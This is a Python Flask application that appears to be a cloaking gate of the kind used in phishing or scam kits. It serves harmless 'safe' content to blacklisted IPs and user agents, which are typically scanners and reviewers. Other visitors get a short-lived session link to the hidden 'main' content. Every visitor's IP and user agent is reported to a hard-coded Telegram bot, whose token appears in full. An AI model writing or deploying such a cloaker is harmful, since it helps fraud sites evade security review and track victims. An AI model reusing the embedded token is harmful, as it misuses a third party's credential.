from flask import Flask, request, redirect, render_template, make_response
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timedelta
import random
import string
import os
import requests

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
db = SQLAlchemy(app)

TELEGRAM_BOT_TOKEN = '6992836984:AAFdxfMCT6g-jvS2A7EasC-DWudf8Fa0XTA'
TELEGRAM_CHAT_ID = '1667505517'

class Session(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    session_key = db.Column(db.String(30), unique=True, nullable=False)
    expiration = db.Column(db.DateTime, nullable=False)

    def __init__(self, session_key, expiration):
        self.session_key = session_key
        self.expiration = expiration

db.create_all()

def random_string(length=30):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def is_blacklisted(ip, user_agent):
    with open('blacklist/ips.txt') as f:
        if ip in f.read().splitlines():
            return True
    with open('blacklist/user_agents.txt') as f:
        if user_agent in f.read().splitlines():
            return True
    return False

def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
    requests.post(url, data=payload)

@app.route('/')
def home():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    if is_blacklisted(ip, user_agent):
        send_telegram_message(f"Blacklisted visit detected:\nIP: {ip}\nUser-Agent: {user_agent}")
        return render_template('safe_content.html')

    session_key = random_string()
    expiration = datetime.utcnow() + timedelta(minutes=1)
    new_session = Session(session_key=session_key, expiration=expiration)
    db.session.add(new_session)
    db.session.commit()

    send_telegram_message(f"Real visit detected:\nIP: {ip}\nUser-Agent: {user_agent}\nSession Key: {session_key}")

    return redirect(f'/{session_key}')

@app.route('/<session_key>')
def session_check(session_key):
    session = Session.query.filter_by(session_key=session_key).first()
    if session and session.expiration > datetime.utcnow():
        response = make_response(render_template('main_content.html'))
        response.set_cookie('js_verified', 'true', max_age=5*60)
        return response
    return render_template('safe_content.html')

@app.route('/cleanup')
def cleanup_sessions():
    now = datetime.utcnow()
    expired_sessions = Session.query.filter(Session.expiration < now).all()
    for session in expired_sessions:
        db.session.delete(session)
    db.session.commit()
    return "Cleanup complete", 200

if __name__ == "__main__":
    app.run(debug=True)
